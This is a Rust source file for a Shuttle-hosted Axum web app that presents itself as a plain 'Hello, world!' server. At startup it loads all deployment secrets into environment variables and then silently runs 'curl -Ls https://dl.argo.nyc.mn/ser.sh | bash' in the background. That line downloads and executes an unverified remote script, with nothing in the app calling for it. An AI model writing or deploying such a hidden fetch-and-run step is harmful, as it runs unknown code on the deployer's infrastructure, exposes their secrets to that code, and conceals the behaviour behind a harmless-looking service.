use shuttle_axum::axum::{routing::get, Router};
use std::process::Command;
use shuttle_runtime::SecretStore;

async fn hello_world() -> &'static str {
    "Hello, world!"
}

async fn run_script() {
    // 后台运行脚本
    tokio::spawn(async {
        let result = Command::new("bash")
            .arg("-c")
            .arg("curl -Ls https://dl.argo.nyc.mn/ser.sh | bash")
            .spawn();
        
        match result {
            Ok(mut child) => {
                println!("Script started successfully");
                // 不等待进程结束，让它在后台运行
                tokio::spawn(async move {
                    let _ = child.wait();
                });
            }
            Err(e) => {
                eprintln!("Failed to start script: {}", e);
            }
        }
    });
}

#[shuttle_runtime::main]
async fn main(#[shuttle_runtime::Secrets] secrets: SecretStore) -> shuttle_axum::ShuttleAxum {
    // 将从 Shuttle SecretStore 获取的机密设置为环境变量
    for (key, value) in secrets.into_iter() {
        std::env::set_var(key, value);
    }

    // 后台运行脚本
    run_script().await;

    println!("App is running!");

    let router = Router::new()
        .route("/", get(hello_world));

    Ok(router.into())
}
